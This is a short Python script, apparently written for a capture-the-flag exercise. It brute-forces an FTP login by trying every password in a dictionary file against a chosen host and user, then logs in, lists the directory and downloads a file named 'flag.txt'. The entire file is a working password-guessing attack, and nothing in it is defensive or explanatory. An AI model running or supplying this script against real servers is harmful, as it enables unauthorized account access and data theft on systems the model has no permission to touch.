from ftplib import FTP


def brute_force_ftp(host, user, dictionary_file):
    with open(dictionary_file, mode='rt') as pd:
        for password in pd:
            password = password.replace('\n', '')
            try:
                ftp = FTP(host=host)
                ftp.login(user=user, passwd=password)
            except Exception as e:
                print(f"wrong pass {password} : {e}")
                continue
            print(f"password: {password}")
            break


def login_to_ftp_site(host, user, passwd):
    ftp = FTP(host=host)
    print(ftp.login(user=user, passwd=passwd))
    ftp.retrlines('LIST')
    ftp.retrlines('RETR flag.txt')
